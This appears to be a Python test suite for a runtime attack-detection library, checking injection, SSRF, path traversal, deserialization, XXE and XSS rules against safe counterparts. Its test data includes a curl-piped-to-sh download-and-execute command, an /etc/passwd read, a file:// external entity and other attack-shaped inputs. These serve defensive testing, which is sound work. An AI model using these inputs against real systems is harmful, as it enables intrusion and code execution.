"""Each structural check, proved with one value built from the structure it
tests, beside the safe counterpart that must not fire. No payload lists:
every value here is assembled from the property under test (a value that
spans several tokens, a path that climbs out of its directory, an address in
a private range, a document that declares an external entity).

Mirrors sdk/typescript/src/rasp/__tests__/detect.test.ts.
"""

import json
import tempfile
from urllib.parse import quote

from shield360.rasp._detect import (
    DNSLOG_SUFFIXES,
    METADATA_HOSTS,
    detect_argv,
    detect_code,
    detect_command,
    detect_deserialization,
    detect_nosql,
    detect_outbound,
    detect_path,
    detect_shell_spawn,
    detect_sql,
    detect_ssrf,
    detect_xml,
    detect_xss,
    is_private_address,
)
from shield360.rasp._lexers import code_tokens, overlapping, shell_tokens, sql_tokens
from shield360.rasp._normalize import add_input, add_model_output, model_fragments, percent_decode


def req(value, key="query.q"):
    out = []
    add_input(out, value, key)
    return out


def model(text):
    out = []
    add_model_output(out, text)
    return out


def sql_quote(v):
    return "'" + v.replace("'", "''") + "'"


def sh_quote(v):
    return "'" + v.replace("'", "'\\''") + "'"


def rule(f):
    return f.rule if f else None


# ---- lexers ----


def test_sql_qualified_name_and_doubled_quote_string_are_one_token_each():
    q = f"SELECT {'.'.join(['db', 'tbl'])} FROM t WHERE a = {sql_quote(chr(39).join(['x', 'y']))}"
    assert [t.kind for t in sql_tokens(q)] == ["word", "name", "word", "word", "word", "word", "op", "string"]


def test_sql_placeholders_are_single_tokens():
    for p in ["?", "$1", ":name", "@name", "%s", "%(name)s"]:
        assert [t.kind for t in sql_tokens(f"a = {p}")] == ["word", "op", "placeholder"]


def test_shell_quoted_segment_stays_inside_one_word():
    tokens, _ = shell_tokens(f"grep {sh_quote('a b|c')} f")
    assert [t.kind for t in tokens] == ["word", "word", "word"]


def test_overlap_uses_half_open_ranges():
    toks = code_tokens("ab cd")
    assert len(overlapping(toks, 0, 2)) == 1
    assert len(overlapping(toks, 1, 3)) == 2


def test_percent_decoding_is_lenient_and_adds_decoded_forms_once_and_twice():
    assert percent_decode("a%2Fb%zz") == "a/b%zz"
    twice = quote(quote("a/b", safe=""), safe="")
    assert [i.value for i in req(twice)] == [twice, quote("a/b", safe=""), "a/b"]


def test_model_output_splits_into_fenced_blocks_then_lines():
    fence = "`" * 3
    assert model_fragments(f"intro\n{fence}\nline one\nline two\n{fence}\noutro") == [
        "line one\nline two",
        "intro",
        "line one",
        "line two",
        "outro",
    ]


# ---- sql_injection ----

# A value made of three non-keyword tokens: identifier, operator, identifier.
SPANNING = " ".join(["col", "=", "col"])


def test_sqli_userinput_an_input_that_spans_several_tokens():
    assert rule(detect_sql(f"SELECT * FROM t WHERE a = {SPANNING}", req(SPANNING))) == "sqli.userinput"


def test_sql_safe_same_input_bound_as_one_string_literal():
    assert detect_sql(f"SELECT * FROM t WHERE a = {sql_quote(SPANNING)}", req(SPANNING)) is None


def test_sql_safe_sort_parameter_of_anti_detect_keywords_and_one_identifier():
    sort = " ".join(["name", "desc"])
    assert detect_sql(f"SELECT * FROM t ORDER BY {sort}", req(sort)) is None


def test_sqli_stacked_separator_inside_the_input_followed_by_another_token():
    # Keywords only, so the token-structure rule's anti-detect filter lets it pass.
    kw = "desc"
    value = ";".join([kw, kw])
    assert rule(detect_sql(f"SELECT * FROM t ORDER BY a {value}", req(value))) == "sqli.stacked"
    assert detect_sql(f"SELECT * FROM t ORDER BY a {kw}", req(kw)) is None


def test_sqli_model_output_spanning_fragment_or_whole_write_statement():
    assert rule(detect_sql(f"SELECT * FROM t WHERE {SPANNING}", model(SPANNING))) == "sqli.model_output"
    write = " ".join(["UPDATE", "t", "SET", "a", "=", "1"])
    assert rule(detect_sql(write, model(write))) == "sqli.model_output"


def test_sql_safe_read_only_select_the_model_wrote_whole():
    read = " ".join(["SELECT", "a", "FROM", "t"])
    assert detect_sql(read, model(read)) is None


def test_sql_safe_whole_query_equal_to_an_input():
    q = f"SELECT * FROM t WHERE {SPANNING}"
    assert detect_sql(q, req(q)) is None


# ---- nosql_injection ----

OP = "$" + "ne"


def test_nosqli_operator_object_from_the_request_body_reaches_the_filter():
    body = {"user": {OP: ""}}
    assert rule(detect_nosql({"user": body["user"]}, [body], [])) == "nosqli.operator"


def test_nosql_safe_server_builds_the_operator_itself():
    body = {"user": "alice"}
    assert detect_nosql({"user": {OP: body["user"]}}, [body], []) is None


def test_nosqli_operator_by_deep_equality():
    body = json.loads(json.dumps({"user": {OP: 1}}))
    assert rule(detect_nosql({"user": {OP: 1.0}}, [body], [])) == "nosqli.operator"
    assert detect_nosql({"user": {OP: True}}, [body], []) is None


def test_nosqli_where_tainted_fragment_spanning_code_tokens():
    value = " ".join(["a", "||", "b"])
    assert rule(detect_nosql({"$where": f"this.x == {value}"}, [{}], req(value))) == "nosqli.where"
    assert detect_nosql({"$where": f"this.x == {json.dumps(value)}"}, [{}], req(value)) is None


# ---- command_injection and shell_spawn ----

CMD_VALUE = ";".join(["a", "b"])


def test_cmdi_userinput_spans_several_shell_tokens():
    assert rule(detect_command(f"ls {CMD_VALUE}", req(CMD_VALUE))) == "cmdi.userinput"
    assert detect_command(f"ls {sh_quote(CMD_VALUE)}", req(CMD_VALUE)) is None


def test_cmdi_substitution_word_splitting_variable_inside_one_word():
    v = "${IFS}".join(["a", "b"])
    assert rule(detect_command(f"echo {v}", req(v))) == "cmdi.substitution"
    assert detect_command("echo a_b", req("a_b")) is None


def test_cmdi_full_command_equals_an_input():
    assert rule(detect_command("uptime", req("uptime"))) == "cmdi.full"


def test_cmdi_model_output_whole_model_command_with_more_than_one_command():
    two = " && ".join(["git status", "git log"])
    assert rule(detect_command(two, model(two))) == "cmdi.model_output"
    assert detect_command("git status", model("git status")) is None


def test_cmdi_executable_argv0_equals_an_input():
    assert rule(detect_argv(["report-tool", "-x"], req("report-tool"))) == "cmdi.executable"
    assert detect_argv(["convert", "report-tool"], req("report-tool")) is None


def test_shell_spawn_during_a_request_unless_allowed_download_exec_any_time():
    assert rule(detect_shell_spawn(argv0="/bin/sh", in_request=True)) == "shell_spawn.shell"
    assert detect_shell_spawn(argv0="/bin/sh", in_request=True, allow=["sh"]) is None
    assert detect_shell_spawn(argv0="/bin/sh", in_request=False) is None
    pipe = " | ".join(["curl -s https://example.com/x", "sh"])
    assert rule(detect_shell_spawn(command=pipe, in_request=False)) == "shell_spawn.download_exec"


# ---- path_traversal and file_write ----

ROOT = "/srv/app/uploads"


def test_path_traversal_input_climbs_out_of_its_directory():
    climb = "/".join(["..", "..", "x.txt"])
    assert rule(detect_path(f"{ROOT}/{climb}", "read", req(climb))) == "path.traversal"
    assert detect_path(f"{ROOT}/x.txt", "read", req("x.txt")) is None


def test_path_absolute_input_is_an_absolute_path_the_call_uses():
    absolute = "/".join(["", "srv", "other", "x.txt"])
    assert rule(detect_path(absolute, "read", req(absolute))) == "path.absolute"


def test_path_nullbyte():
    v = "\0.".join(["x.txt", "png"])
    assert rule(detect_path(f"{ROOT}/x.txt", "read", req(v))) == "path.nullbyte"


def test_path_outside_root():
    assert rule(detect_path("/srv/app/other/x.txt", "read", req("x.txt"), [ROOT])) == "path.outside_root"
    assert detect_path(f"{ROOT}/x.txt", "read", req("x.txt"), [ROOT]) is None


def test_path_sensitive():
    assert rule(detect_path("/etc/" + "passwd", "read", req("passwd"))) == "path.sensitive"
    assert detect_path("/etc/" + "passwd", "read", req("report.pdf")) is None


def test_file_write_script_and_ntfs_streams():
    name = ".".join(["upload", "js"])
    tmp = tempfile.gettempdir()
    assert rule(detect_path(f"{tmp}/{name}", "write", req(name))) == "file_write.script"
    assert detect_path(f"{tmp}/{name}", "read", req(name)) is None
    assert rule(detect_path(f"{ROOT}/x.txt" + "::$DATA", "write", [])) == "file_write.ntfs"


# ---- ssrf and outbound ----


def url(host, scheme="http"):
    return f"{scheme}://{host}/"


def test_ssrf_internal_by_literal_or_by_resolved_address():
    host = ".".join(["10", "0", "0", "5"])
    assert rule(detect_ssrf(url(host), req(host))) == "ssrf.internal"
    assert rule(detect_ssrf(url("svc.example.com"), req("svc.example.com"), [host])) == "ssrf.internal"
    assert detect_ssrf(url(host), req("report.pdf")) is None
    pub = ".".join(["93", "184", "216", "34"])
    assert detect_ssrf(url(pub), req(pub)) is None


def test_address_classes_ipv4_mapped_ipv6_is_decoded_first():
    assert is_private_address("::ffff:" + ".".join(["127", "0", "0", "1"]))
    assert not is_private_address("::ffff:" + ".".join(["93", "184", "216", "34"]))
    assert is_private_address("fe80::1")


def test_ssrf_metadata_tainted_untainted_sdk_calls_pass():
    host = METADATA_HOSTS[0]
    assert rule(detect_ssrf(url(host), req(host))) == "ssrf.metadata"
    assert detect_ssrf(url(host), req("report.pdf")) is None


def test_ssrf_obfuscated_loopback_as_one_decimal_number():
    decimal = str((127 << 24) | 1)
    assert rule(detect_ssrf(url(decimal), req(decimal))) == "ssrf.obfuscated"


def test_ssrf_protocol_tainted_host_under_a_non_http_scheme():
    assert rule(detect_ssrf(url("files.example.com", "gopher"), req("files.example.com"))) == "ssrf.protocol"
    assert detect_ssrf(url("files.example.com", "https"), req("files.example.com")) is None


def test_ssrf_dnslog():
    host = f"probe{DNSLOG_SUFFIXES[0]}"
    assert rule(detect_ssrf(url(host), req(host))) == "ssrf.dnslog"


def test_outbound_not_allowed_only_with_a_non_empty_allow_list():
    assert rule(detect_outbound(url("api.example.com"), ["*.example.org"])) == "outbound.not_allowed"
    assert detect_outbound(url("api.example.org"), ["*.example.org"]) is None
    assert detect_outbound(url("api.example.com"), []) is None


# ---- deserialization and code_injection ----


def test_deser_pickle_tainted_data_always_fires_untainted_never():
    data = bytes([0x80, 4, 0x95]).decode("latin-1") + "payload-bytes"
    assert rule(detect_deserialization("pickle", data, req(data))) == "deser.pickle"
    assert detect_deserialization("pickle", data, req("report.pdf")) is None


def test_deser_typename_tainted_json_naming_a_type():
    typed = json.dumps({"$" + "type": "Some.Type", "v": 1})
    assert rule(detect_deserialization("typename", typed, req(typed))) == "deser.typename"
    plain = json.dumps({"name": "x", "v": 1})
    assert detect_deserialization("typename", plain, req(plain)) is None


def test_deser_java_tainted_stream_always_fires_untainted_never():
    data = bytes([0xAC, 0xED, 0x00, 0x05]).decode("latin-1") + "payload-bytes"
    assert rule(detect_deserialization("java", data, req(data))) == "deser.java"
    assert detect_deserialization("java", data, req("report.pdf")) is None


def test_deser_snakeyaml_class_tag_fires_standard_tag_passes():
    tagged = "a: !!java.util.ArrayList []"
    assert rule(detect_deserialization("snakeyaml", tagged, req(tagged))) == "deser.yaml"
    assert detect_deserialization("snakeyaml", tagged, req("report.pdf")) is None
    standard = "name: !!str 12345"
    assert detect_deserialization("snakeyaml", standard, req(standard)) is None


def test_code_eval_spanning_value_fires_string_literal_passes():
    value = " ".join(["a", "+", "b"])
    assert rule(detect_code(f"f({value})", req(value))) == "code.eval"
    assert detect_code(f"f({json.dumps(value)})", req(value)) is None


# ---- xxe ----


def doc(subset):
    return f'<?xml version="1.0"?><!DOCTYPE r [{subset}]><r>&e;</r>'


def external(uri):
    return doc(f'<!ENTITY e SYSTEM "{uri}">')


def test_xxe_external_entity_parser_resolving_them():
    x = external("https://example.com/defs.dtd")
    assert rule(detect_xml(x, req(x, "body"), True)) == "xxe.external_entity"
    assert rule(detect_xml(x, req(x, "body"), False)) == "xxe.doctype"
    assert detect_xml(x, req("report.pdf"), True) is None


def test_xxe_file_absolute_file_that_is_not_a_dtd():
    x = external("file://" + "/".join(["", "srv", "data", "x.txt"]))
    assert rule(detect_xml(x, req(x, "body"), True)) == "xxe.file"


def test_xxe_protocol_non_http_scheme():
    x = external("ftp://files.example.com/x")
    assert rule(detect_xml(x, req(x, "body"), True)) == "xxe.protocol"


def test_xxe_billion_laughs_three_internal_entities_expanding_others():
    chain = "".join(['<!ENTITY e0 "x">'] + [f'<!ENTITY e{i} "&e{i - 1};&e{i - 1};">' for i in (1, 2, 3)])
    x = doc(chain)
    assert rule(detect_xml(x, req(x, "body"), True)) == "xxe.billion_laughs"
    one = doc('<!ENTITY e "Acme">')
    assert detect_xml(one, req(one, "body"), True) is None


# ---- xss ----

XSS_VALUE = f"<b>{'x' * 16}</b>"


def test_xss_reflected_markup_shaped_input_reflected_verbatim():
    assert rule(detect_xss("text/html", f"<p>{XSS_VALUE}</p>", req(XSS_VALUE))) == "xss.reflected"


def test_xss_safe_escaped_or_not_html():
    escaped = XSS_VALUE.replace("<", "&lt;").replace(">", "&gt;")
    assert detect_xss("text/html", f"<p>{escaped}</p>", req(XSS_VALUE)) is None
    assert detect_xss("application/json", json.dumps({"value": XSS_VALUE}), req(XSS_VALUE)) is None
